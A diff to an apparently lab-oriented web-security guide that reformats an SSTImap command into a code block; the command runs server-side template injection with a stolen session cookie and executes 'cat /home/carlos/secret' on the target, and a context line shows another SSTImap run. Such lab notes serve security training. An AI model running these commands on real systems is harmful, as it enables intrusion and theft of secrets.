@@ -1245,7 +1245,9 @@ python /opt/SSTImap/sstimap.py --engine erb -u https://TARGET.net/?message=Unfor
 
 >POST request data param to test and send payload using SSTImap.  
 
->```python /opt/SSTImap/sstimap.py -u https://TARGET.net/product/template?productId=1 --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken&template=fuzzer&template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'```  
+```bash
+python /opt/SSTImap/sstimap.py -u https://TARGET.net/product/template?productId=1 --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken&template=fuzzer&template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'
+```  
 
 ![SSTImap Tool](images/sstimap.png)  
 
